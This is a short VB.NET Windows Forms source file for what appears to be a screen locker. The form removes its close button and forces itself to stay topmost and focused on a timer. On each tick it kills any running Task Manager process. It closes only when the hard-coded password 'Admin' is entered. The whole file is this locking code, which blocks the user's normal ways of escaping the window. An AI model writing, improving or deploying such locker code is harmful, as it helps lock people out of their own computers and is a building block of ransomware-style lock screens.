
Public Class Form1


    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

   
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.TopMost = True
        Me.BringToFront()
        Me.Focus()
        For Each SelProcess As Process In Process.GetProcesses
            If SelProcess.ProcessName = "taskmgr" Then
                SelProcess.Kill()
                Exit For
            End If
        Next
        Me.Enabled = True
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If TextBox1.Text = "Admin" Then
            Application.Exit()
        Else
            MessageBox.Show("Invalid Password")
        End If
    End Sub
End Class
